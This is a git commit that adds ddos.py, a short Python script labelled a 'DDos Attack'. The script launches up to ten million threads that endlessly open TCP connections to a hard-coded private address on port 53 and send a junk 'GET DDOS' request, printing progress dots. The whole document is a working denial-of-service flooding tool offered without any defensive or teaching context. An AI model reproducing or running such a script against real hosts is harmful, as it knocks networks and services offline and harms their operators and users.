56dfbb7c8e8ccee1bfd58ea53f25a32329deebf2
Max Janorschke <mm.madmax2506@gmail.com>
2020-08-30 11:46:27 +0200

    DDos

---
+++ ddos.py
@@ -0,0 +1,24 @@
+import socket
+from threading import Thread
+
+host = "192.168.178.1"
+ip = socket.gethostbyname(host)
+port = 53
+
+def dos():
+    while True:
+        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            mysocket.connect((ip, port))
+            mysocket.send(str.encode("GET " + "DDOS" + "HTTP/1.1 \r\n"))
+            mysocket.sendto(str.encode("GET " + "DDOS" + "HTTP/1.1 \r\n"), (ip, port))
+            print(".", end="")
+        except socket.error as e:
+            print()
+            print("===== Cannot send the packet =====")
+        mysocket.close()
+
+print("===== Start DDos Attack =====")
+for i in range(10000000):
+    t = Thread(target=dos)
+    t.start()
